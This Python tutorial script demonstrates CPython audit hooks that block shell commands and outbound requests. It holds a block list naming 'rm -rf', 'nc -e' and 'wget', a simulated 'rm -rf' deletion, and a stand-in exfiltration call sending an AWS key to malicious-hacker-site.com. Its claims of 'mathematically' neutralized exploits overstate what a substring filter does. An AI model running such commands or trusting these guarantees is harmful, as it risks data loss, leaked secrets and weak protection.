# Phase 3, Day 207: Python Fundamentals - Interpreter Audit Hooks (sys.addaudithook)
import sys
import os
import urllib.request

print("--- Booting CPython Zero-Trust Security Kernel ---")

# 1. The Threat Matrix (Actions we mathematically refuse to allow the interpreter to execute)
BANNED_OS_COMMANDS = ['rm -rf', 'nc -e', 'wget']
BANNED_NETWORK_DOMAINS = ['malicious-hacker-site.com']

# 2. The Enterprise Audit Hook
def enterprise_security_interceptor(event_name, args):
    """
    This function is called by the CPython Kernel for EVERY sensitive action.
    event_name: The internal CPython tag (e.g., 'os.system', 'urllib.Request')
    args: The parameters being passed to the hardware.
    """
    
    # Shield 1: Intercept OS-level command execution
    if event_name == "os.system":
        command = args[0]
        print(f"  [Security Hook] Intercepted OS Command execution request: '{command}'")
        
        for banned_term in BANNED_OS_COMMANDS:
            if banned_term in command:
                # We physically abort the CPython execution cycle before it reaches the OS
                raise PermissionError(f"ZERO-TRUST VIOLATION: Execution of '{banned_term}' blocked at interpreter level.")

    # Shield 2: Intercept outbound network connections
    if event_name == "urllib.Request":
        url = args[0]
        print(f"  [Security Hook] Intercepted Network Request to: '{url}'")
        
        for domain in BANNED_NETWORK_DOMAINS:
            if domain in url:
                raise PermissionError(f"ZERO-TRUST VIOLATION: Exfiltration to '{domain}' blocked.")

# --- Execution Environment ---

print("\n[System] Arming kernel-level audit hooks...\n")
# 3. Inject the security hook into the interpreter
sys.addaudithook(enterprise_security_interceptor)

# --- Simulate an Attack ---

print("--- Attack Simulation 1: Rogue OS Command ---")
try:
    # The hacker manages to inject an os.system call into our backend
    # This looks like standard Python, but the Audit Hook catches it instantly.
    os.system("echo 'Normal Server Output' && rm -rf /simulated/database")
except PermissionError as e:
    print(f"\n[ALERT] THREAT NEUTRALIZED: {e}")

print("\n--- Attack Simulation 2: Data Exfiltration ---")
try:
    # The hacker tries to send our API keys to their server
    urllib.request.urlopen("http://malicious-hacker-site.com/steal?key=AWS_SECRET")
except PermissionError as e:
    print(f"\n[ALERT] THREAT NEUTRALIZED: {e}")
except Exception as e:
    # Catching standard URL errors if the site actually doesn't exist, but the hook should trigger first
    print(e)

print("\n--- Legitimate Execution ---")
# The hook allows benign commands to pass through unhindered
print("Executing benign command: ls -la")
os.system("ls -la")

print("\nStatus: Python fundamentals verified. OS-level interpreter exploits mathematically neutralized via CPython audit hooks.")